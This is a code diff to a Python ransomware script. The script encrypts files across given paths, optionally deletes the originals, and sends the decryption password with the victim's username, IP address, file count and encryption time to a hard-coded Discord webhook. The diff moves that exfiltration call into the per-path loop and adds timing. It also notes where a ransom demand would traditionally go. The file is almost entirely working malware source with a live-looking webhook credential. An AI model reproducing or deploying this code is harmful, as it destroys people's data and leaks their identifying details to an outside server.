@@ -1,3 +1,4 @@
+from ast import Num
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 from pathlib import Path
@@ -6,6 +7,7 @@ import concurrent.futures
 import string
 import os
 import random
+import time
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
@@ -14,6 +16,7 @@ import socket
 from os.path import dirname, abspath
 
 os.chdir(dirname(abspath(__file__)))
+print(os.getcwd())
 
 if os.path.exists("./keys"):
     pass
@@ -210,6 +213,8 @@ def generateEncryptThreads(fileExtensions, password, removeFiles, path):
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=maxWorker) as executor:
         for filePath in filePaths:
+            global encryptCount
+            encryptCount = len(filePaths)
             executor.submit(encryptFile, *(filePath, password))
     if removeFiles:
         for filePath in filePaths:
@@ -452,21 +457,23 @@ if os.path.exists(f"{keypath}finished.done"):
     pass
 else:
     hostname = socket.gethostname()
-    webhook = DiscordWebhook(
-        url="https://discord.com/api/webhooks/990727870055845959/BQM38M7KSMnMNEA3yuJ1PvlkFjdfMgU4Eaij-Pf8AeRABPmgwGS_9JGtKSHcY7_XOPMm",
-        content=f"Decryption Key Generated\n`{password}`\nThis key belongs to:\n`{os.getlogin()}, {socket.gethostbyname(hostname)}`\nThis key is valid for the following files:\n`{fileExtensions}`",
-    )
-    webhook.execute()
     for x in paths:
         path = x
+        startTime = time.time()
         generateEncryptThreads(fileExtensions, password, removeFiles, path)
+        endTime = time.time()
+        webhook = DiscordWebhook(
+            url="https://discord.com/api/webhooks/990727870055845959/BQM38M7KSMnMNEA3yuJ1PvlkFjdfMgU4Eaij-Pf8AeRABPmgwGS_9JGtKSHcY7_XOPMm",
+            content=f"Decryption Key Generated\n`{password}`\nThis key belongs to:\n`{os.getlogin()}, {socket.gethostbyname(hostname)}`\nThis key is valid for `{encryptCount}` files\nTime to encypt: `{int(endTime - startTime)} seconds`",
+        )
+        webhook.execute()
     with open(f"{keypath}finished.done", "w") as finished:
         finished.close()
 
 
-print("Oh no! All your files are encrypted!")
+print(f"Oh no! Your files have been encrypted!")
 
-#   this is where you would traditionally call a ransom
+#   this is where you would traditionally call a ransom, we are instead just asking for a password that will be used to decrypt the files
 #   ransom()
 
 decryptend = input("Enter password to decrypt: ")
